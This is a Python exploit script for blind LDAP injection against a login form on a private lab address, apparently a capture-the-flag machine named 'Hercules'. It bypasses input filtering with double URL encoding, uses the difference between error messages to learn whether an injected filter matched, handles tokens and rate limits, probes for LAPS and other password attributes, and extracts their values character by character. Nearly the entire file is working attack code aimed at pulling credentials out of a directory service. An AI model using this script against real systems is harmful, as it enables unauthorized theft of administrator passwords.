#!/usr/bin/env python3
"""
Blind LDAP extraction for Hercules.

Uses the double-URL-encoded injection in /Login's username field. The app's
LDAP filter is roughly (&(sAMAccountName=<INJ>)(...)) inside a specific search
base, so injecting 'x)(attr=value' appends our own conditions.

Key facts learned:
  * double URL encoding bypasses the regex (app decodes twice)
  * "Login attempt failed"  -> >=1 entry matched
  * "Invalid login attempt" -> 0 entries matched
  * ordering comparisons (>=, <=) work -> enables binary search
"""
import re
import sys
import time
import urllib.parse

import requests
import urllib3

urllib3.disable_warnings()

LOGIN = "https://10.129.242.196/Login"
S = requests.Session()
S.verify = False
_tok = {"v": None, "t": 0.0}
_last = [0.0]
GAP = 1.05


def dbl(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


def _token(force=False):
    if not force and _tok["v"] and time.time() - _tok["t"] < 120:
        return _tok["v"]
    r = S.get(LOGIN, timeout=15)
    m = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text)
    _tok["v"] = m.group(1)
    _tok["t"] = time.time()
    return _tok["v"]


def raw_post(username_encoded, password="x"):
    for _ in range(8):
        d = _last[0] - time.time()
        if d > 0:
            time.sleep(d)
        _last[0] = time.time() + GAP
        body = (f"Username={username_encoded}&Password={password}"
                f"&RememberMe=false&__RequestVerificationToken={_token()}")
        r = S.post(LOGIN, data=body.encode(),
                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                   timeout=20)
        if r.status_code == 429:
            _tok["v"] = None
            print("    [429] sleeping 33s", flush=True)
            time.sleep(33)
            _last[0] = time.time() + GAP
            continue
        if len(r.text) == 3213 and "Invalid login attempt" not in r.text:
            # token/session hiccup -> refresh token once
            _tok["v"] = None
            continue
        return r.text
    return ""


def test(injection):
    """True if injection yields >=1 match."""
    h = raw_post(dbl(injection))
    return "Login attempt failed" in h


def test_direct(raw_encoded):
    h = raw_post(raw_encoded)
    return "Login attempt failed" in h


# ASCII-ordered charset. LDAP/AD string ordering is used for binary search.
ORDER = ("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"
         " !\"#$%&'()*+,-./:;<=>?@[\\]^`{|}~")


def extract_by_scan(cond_tpl, known="", maxlen=40, charset=None):
    """cond_tpl contains '@' where the value-with-wildcard goes, e.g.
    '*)(description=@*'"""
    charset = charset or ("abcdefghijklmnopqrstuvwxyz0123456789_"
                          "ABCDEFGHIJKLMNOPQRSTUVWXYZ-!.@#$%^&*+={}[]:;,?/|~ ")
    val = known
    while len(val) < maxlen:
        hit = None
        for c in charset:
            if test(cond_tpl.replace("@", val + c)):
                hit = c
                break
        if hit is None:
            break
        val += hit
        print(f"      {val!r}", flush=True)
    return val


if __name__ == "__main__":
    mode = sys.argv[1]
    if mode == "laps":
        for a in ["ms-Mcs-AdmPwd", "msLAPS-Password", "msLAPS-PasswordExpirationTime",
                  "ms-Mcs-AdmPwdExpirationTime", "userPassword", "unicodePwd",
                  "sAMAccountName", "servicePrincipalName", "adminCount",
                  "memberOf", "objectClass", "extensionAttribute1",
                  "extensionAttribute2", "ipPhone", "physicalDeliveryOfficeName"]:
            print(f"{a:32s} {test('* )(' .replace(' ', '') + a + '=*')}", flush=True)
    elif mode == "scan":
        expr = sys.argv[2]
        known = sys.argv[3] if len(sys.argv) > 3 else ""
        print("RESULT:", extract_by_scan(expr, known), flush=True)
